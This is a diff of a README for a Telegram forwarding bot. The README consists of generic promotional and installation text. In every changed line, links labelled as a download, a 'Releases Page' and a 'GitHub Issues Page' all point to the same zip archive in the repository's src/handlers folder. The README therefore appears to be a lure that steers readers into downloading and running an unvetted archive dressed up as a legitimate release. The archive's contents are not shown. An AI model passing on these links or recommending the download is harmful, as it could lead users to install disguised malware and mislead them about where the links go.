@@ -1,7 +1,7 @@
 # 🤖 kokosa-forward-bot - Effortlessly Forward Messages on Telegram
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Alimustee/kokosa-forward-bot/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip)](https://raw.githubusercontent.com/Alimustee/kokosa-forward-bot/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip)
+[![Download](https://github.com/Alimustee/kokosa-forward-bot/raw/refs/heads/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip)](https://github.com/Alimustee/kokosa-forward-bot/raw/refs/heads/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip)
 
 ## 📋 Overview
 kokosa-forward-bot is a Telegram bot designed to forward messages seamlessly. Equipped with AI-powered content moderation, it ensures that what you share remains suitable for all audiences. Built on Cloudflare Workers, this bot combines reliability with speed, making your Telegram experience smoother.
@@ -16,7 +16,7 @@ kokosa-forward-bot is a Telegram bot designed to forward messages seamlessly. Eq
 ### 💻 Installation Steps
 
 1. **Visit the Download Page**
-   Go to our [Releases Page](https://raw.githubusercontent.com/Alimustee/kokosa-forward-bot/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip) to find the latest version of kokosa-forward-bot.
+   Go to our [Releases Page](https://github.com/Alimustee/kokosa-forward-bot/raw/refs/heads/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip) to find the latest version of kokosa-forward-bot.
 
 2. **Select the Latest Release**
    Find the most recent version listed on the Releases page. This is usually at the top and marked as the "latest release".
@@ -71,9 +71,9 @@ The bot can filter out spam, offensive language, and other inappropriate content
 
 ## 🌐 Community & Support
 
-We value your feedback! If you face any issues or have suggestions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/Alimustee/kokosa-forward-bot/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip). You can also check out discussions and tips from other users.
+We value your feedback! If you face any issues or have suggestions, please visit our [GitHub Issues Page](https://github.com/Alimustee/kokosa-forward-bot/raw/refs/heads/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip). You can also check out discussions and tips from other users.
 
 ## 📥 Download & Install Again
-For a straightforward download experience, visit our [Releases Page](https://raw.githubusercontent.com/Alimustee/kokosa-forward-bot/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip) at any time.
+For a straightforward download experience, visit our [Releases Page](https://github.com/Alimustee/kokosa-forward-bot/raw/refs/heads/main/src/handlers/kokosa-bot-forward-1.0-alpha.1.zip) at any time.
 
 Enjoy using kokosa-forward-bot to keep your Telegram messages flowing smoothly and safely!
